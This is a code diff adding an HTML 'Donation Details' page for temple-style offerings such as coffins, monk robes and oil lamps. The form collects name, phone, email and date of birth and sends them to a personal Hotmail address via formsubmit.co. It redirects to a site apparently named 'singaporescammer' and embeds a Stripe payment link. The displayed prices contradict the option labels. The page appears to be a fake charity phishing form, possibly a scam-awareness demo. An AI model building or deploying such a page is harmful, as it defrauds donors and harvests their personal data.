@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Donation Details</title>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      background-color: #f5f2e7;
+      font-family: 'Noto Serif', serif;
+      color: #4b2e2e;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 700px;
+      margin: 40px auto;
+      background: #fff9e5;
+      padding: 30px;
+      border: 2px solid #e5c89c;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      text-align: center;
+      color: #a12525;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 1em;
+    }
+
+    .amount {
+      margin-top: 20px;
+      font-size: 1.2em;
+      color: #a12525;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    iframe {
+      display: block;
+      width: 100%;
+      height: 300px;
+      border: none;
+      margin-top: 20px;
+    }
+
+    .submit-btn {
+      background: #a12525;
+      color: #fff9e5;
+      padding: 12px;
+      margin-top: 30px;
+      border: none;
+      border-radius: 6px;
+      font-size: 1.2em;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background: #801d1d;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Donation Details</h1>
+    <form action="https://formsubmit.co/endgameis21@hotmail.com" method="POST">
+      <input type="hidden" name="_next" value="https://singaporescammer.github.io/sgalert/thank-you.html"/>
+
+      <label for="name">Full Name</label>
+      <input type="text" name="Name" required />
+
+      <label for="contact">Contact Number</label>
+      <input type="text" name="Contact" required />
+
+      <label for="email">Email Address</label>
+      <input type="email" name="Email" required />
+
+      <label for="dob">Date of Birth</label>
+      <input type="date" name="Date of Birth" required />
+
+      <label for="donation">Select Donation Type</label>
+      <select name="Donation Option" id="donation" required onchange="updateAmount()">
+        <option value="">-- Choose an Option --</option>
+        <option value="Donate Coffin">Donate Coffin – $500</option>
+        <option value="Food Hamper">Food Hamper – $58</option>
+        <option value="Temple Tiles">Temple Tiles – $38</option>
+        <option value="Monk Robe">Monk Robe – $70</option>
+        <option value="Animal Release">Animal Release – $38</option>
+        <option value="Oil Lamp">Oil Lamp – $15</option>
+      </select>
+
+      <div class="amount" id="amountDisplay">Selected Amount: -</div>
+
+      <iframe src="https://buy.stripe.com/00geV99wa3Rr2zu7sz"></iframe>
+
+      <button type="submit" class="submit-btn">Confirm & Submit</button>
+    </form>
+  </div>
+
+  <script>
+    function updateAmount() {
+      const donation = document.getElementById("donation").value;
+      const amountDisplay = document.getElementById("amountDisplay");
+      const prices = {
+        "Donate Coffin": "$50",
+        "Food Hamper": "$30",
+        "Temple Tiles": "$10",
+        "Monk Robe": "$80",
+        "Animal Release": "$20",
+        "Oil Lamp": "$15"
+      };
+      amountDisplay.textContent = donation ? `Selected Amount: ${prices[donation]}` : "Selected Amount: -";
+    }
+  </script>
+</body>
+</html>
